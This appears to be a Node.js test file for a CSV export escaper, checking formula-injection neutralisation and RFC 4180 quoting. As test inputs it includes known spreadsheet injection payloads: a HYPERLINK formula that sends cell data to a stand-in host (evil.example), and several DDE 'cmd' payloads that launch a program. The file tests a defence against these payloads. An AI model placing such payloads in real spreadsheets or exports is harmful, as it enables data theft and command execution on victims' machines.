/**
 * F-19: CSV export escaping (formula injection + RFC 4180 quoting).
 * Exercises the real src/lib/csv.ts. Run: node --test scripts/test_f19_csv_export.mjs
 */
import test from "node:test";
import assert from "node:assert/strict";
import { createTsLoader } from "./ts-loader.mjs";

const { escapeCsvCell, buildCsv, neutralizeFormula } = createTsLoader().load("src/lib/csv.ts");

test("cells starting with = + - @ TAB CR are neutralised with a leading quote", () => {
  assert.equal(escapeCsvCell("=1+1"), "'=1+1");
  assert.equal(escapeCsvCell("+964770123456"), "'+964770123456");
  assert.equal(escapeCsvCell("-2+3"), "'-2+3");
  assert.equal(escapeCsvCell("@SUM(A1)"), "'@SUM(A1)");
  assert.equal(escapeCsvCell("\t=1+1"), "'\t=1+1");
  // CR/LF force RFC 4180 quoting AFTER neutralising
  assert.equal(escapeCsvCell("\r=1+1"), "\"'\r=1+1\"");
  assert.equal(escapeCsvCell("\n=1+1"), "\"'\n=1+1\"");
});

test("classic payloads are inert", () => {
  assert.equal(
    escapeCsvCell('=HYPERLINK("http://evil.example/?x="&A1,"Click")'),
    `"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")"`,
  );
  assert.equal(escapeCsvCell("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0");
  assert.equal(escapeCsvCell("-cmd|' /C calc'!A0"), "'-cmd|' /C calc'!A0");
  assert.equal(escapeCsvCell("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0");
  assert.equal(escapeCsvCell("@SUM(1+1)*cmd|' /C calc'!A0"), "'@SUM(1+1)*cmd|' /C calc'!A0");
});

test("leading spaces before a trigger are neutralised too", () => {
  assert.equal(escapeCsvCell(" =1+1"), "' =1+1");
  assert.equal(escapeCsvCell("  -x"), "'  -x");
});

test("legitimate plain numbers stay numeric (negative included)", () => {
  for (const v of ["0", "12", "-12", "3.5", "-0.5", "1250000", "-1250000.25"]) {
    assert.equal(escapeCsvCell(v), v, v);
    assert.equal(neutralizeFormula(v), v, v);
  }
  // Real JS numbers (rows may carry them at runtime)
  assert.equal(escapeCsvCell(-3), "-3");
  assert.equal(escapeCsvCell(4.25), "4.25");
});

test("number-looking text that can still carry a formula is NOT exempt", () => {
  for (const v of ["-5-3", "-1e5", "-5+cmd", "+5", "+1", "--1", "-", "+", "=", "@", "-.5", "- 5"]) {
    assert.ok(escapeCsvCell(v).startsWith("'") || escapeCsvCell(v).startsWith("\"'"), v);
  }
});

test("ordinary text, empty values and non-latin text are unchanged", () => {
  assert.equal(escapeCsvCell("Toyota Camry"), "Toyota Camry");
  assert.equal(escapeCsvCell(""), "");
  assert.equal(escapeCsvCell(null), "");
  assert.equal(escapeCsvCell(undefined), "");
  assert.equal(escapeCsvCell("سيارة جيدة"), "سيارة جيدة");
  assert.equal(escapeCsvCell("2024-05-01T10:00:00"), "2024-05-01T10:00:00");
  assert.equal(escapeCsvCell("a=b"), "a=b");
});

test("RFC 4180 quoting: comma, quote, LF and CR", () => {
  assert.equal(escapeCsvCell("a,b"), '"a,b"');
  assert.equal(escapeCsvCell('say "hi"'), '"say ""hi"""');
  assert.equal(escapeCsvCell("line1\nline2"), '"line1\nline2"');
  assert.equal(escapeCsvCell("line1\r\nline2"), '"line1\r\nline2"');
  assert.equal(escapeCsvCell("line1\rline2"), '"line1\rline2"');
});

test("buildCsv escapes headers and every row, ends with a newline", () => {
  const csv = buildCsv(
    ["Name", "=bad", "Price"],
    [
      ["Ali, Jr.", "ok", "-5"],
      ["=1+1", '"q"', "12"],
    ],
  );
  assert.equal(csv, `Name,'=bad,Price\n"Ali, Jr.",ok,-5\n'=1+1,"""q""",12\n`);
});
